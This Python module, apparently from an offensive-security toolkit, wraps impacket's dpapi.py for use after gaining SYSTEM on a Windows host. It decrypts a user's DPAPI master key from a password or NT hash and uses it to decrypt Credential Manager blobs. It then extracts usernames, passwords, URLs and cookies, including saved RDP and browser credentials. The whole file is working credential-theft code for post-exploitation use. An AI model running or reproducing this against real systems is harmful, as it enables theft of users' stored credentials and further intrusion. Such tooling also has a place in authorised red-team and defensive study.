"""DPAPI — Windows Data Protection API secret decryption.

Thin wrapper over impacket's ``dpapi.py`` for the two most-
common operator moves after landing SYSTEM on a Windows box:

  * ``masterkey`` — decrypt a user's DPAPI master key file (from
    C:\\Users\\<u>\\AppData\\Roaming\\Microsoft\\Protect\\<sid>\\)
    using the user's password (or NT hash) + SID. Returns the
    unlocked master key needed for every subsequent DPAPI
    operation on that user.

  * ``credhist`` — decrypt a Credential Manager blob (from
    C:\\Users\\<u>\\AppData\\Local\\Microsoft\\Credentials\\) with
    an unlocked master key. Returns Chrome/Edge cookies, saved
    RDP credentials, Windows Vault entries.

Every fieldkit engagement with a Windows foothold leaves DPAPI
secrets on the table — this module surfaces the standard
decryption workflow without the operator having to remember
the impacket-dpapi CLI shape.
"""
import os
import shutil
from dataclasses import dataclass

from . import runner


@dataclass(frozen=True)
class DpapiResult:
    """Outcome of a single dpapi.py invocation.

    ``kind`` is ``ok`` / ``fail`` / ``no-tool``. ``output`` is the
    tool's stdout+stderr merged (for the operator to eyeball).
    ``artifact`` is the extracted secret text on ``ok`` — for
    ``masterkey`` this is the decrypted key; for ``credhist``
    this is the parsed credential dump.
    """
    kind: str
    output: str
    artifact: str = ""


DPAPI_RESULT_KINDS = frozenset({"ok", "fail", "no-tool"})


def find_tool():
    """Return the path to ``dpapi.py`` (impacket) on PATH, or
    None. Checked names cover both the pipx-shipped shim and
    the direct-clone form."""
    for name in ("dpapi.py", "impacket-dpapi"):
        p = shutil.which(name)
        if p:
            return p
    return None


def _run_dpapi(argv, timeout=60):
    """Common dpapi.py invocation wrapper — routes through
    :mod:`fieldkit.runner` per rule 2, classifies the outcome
    into a :class:`DpapiResult`."""
    tool = find_tool()
    if not tool:
        return DpapiResult(kind="no-tool",
                             output="dpapi.py not on PATH — "
                                    "install impacket "
                                    "(`pipx install impacket`)")
    full = [tool] + list(argv)
    result = runner.run(full, timeout=timeout)
    if result.error:
        return DpapiResult(kind="fail", output=str(result.error))
    if result.timed_out:
        return DpapiResult(kind="fail", output="dpapi.py timed out")
    output = (result.stdout or "") + (result.stderr or "")
    # dpapi.py's error markers
    fail_markers = ("[-]", "Error:", "Exception:")
    if any(m in output for m in fail_markers):
        return DpapiResult(kind="fail", output=output.strip())
    return DpapiResult(kind="ok", output=output.strip(),
                        artifact=_extract_artifact(argv, output))


def _extract_artifact(argv, output):
    """Pull the primary artifact string from dpapi.py output —
    the decrypted master key for `masterkey` mode, the parsed
    cred blob for `credhist`. Best-effort; on parse fail returns
    the whole output so the operator sees everything."""
    subcommand = argv[0] if argv else ""
    if subcommand == "masterkey":
        # dpapi.py masterkey prints something like:
        #   "Decrypted key: <hex>"
        for line in output.splitlines():
            if "Decrypted key:" in line:
                return line.split(":", 1)[1].strip()
    if subcommand in ("credential", "vault"):
        # dpapi.py credential prints "Username: ... / Password: ..."
        blocks = []
        for line in output.splitlines():
            if line.strip().startswith(("Username:", "Password:",
                                          "URL:", "Cookie:")):
                blocks.append(line.strip())
        if blocks:
            return "\n".join(blocks)
    return output.strip()


def decrypt_masterkey(masterkey_file, sid, password=None, nt_hash=None,
                        timeout=60):
    """Decrypt a DPAPI master key file with the user's password
    (or NT hash) + SID. Returns a :class:`DpapiResult` — on
    ``ok`` the ``artifact`` is the decrypted key hex."""
    if not os.path.isfile(masterkey_file):
        return DpapiResult(kind="fail",
                             output=f"{masterkey_file}: no such file")
    argv = ["masterkey",
            "-file", masterkey_file,
            "-sid", sid]
    if password:
        argv += ["-password", password]
    elif nt_hash:
        argv += ["-key", f"0x{nt_hash}"]
    else:
        return DpapiResult(kind="fail",
                             output="need --password or --nt-hash to decrypt")
    return _run_dpapi(argv, timeout=timeout)


def decrypt_credential(cred_blob_file, masterkey_hex, timeout=60):
    """Decrypt a Credential Manager blob with an unlocked master
    key. Returns a :class:`DpapiResult` — on ``ok`` the
    ``artifact`` is the parsed cred blob (Username, Password,
    URL lines)."""
    if not os.path.isfile(cred_blob_file):
        return DpapiResult(kind="fail",
                             output=f"{cred_blob_file}: no such file")
    argv = ["credential",
            "-file", cred_blob_file,
            "-key", f"0x{masterkey_hex}"]
    return _run_dpapi(argv, timeout=timeout)
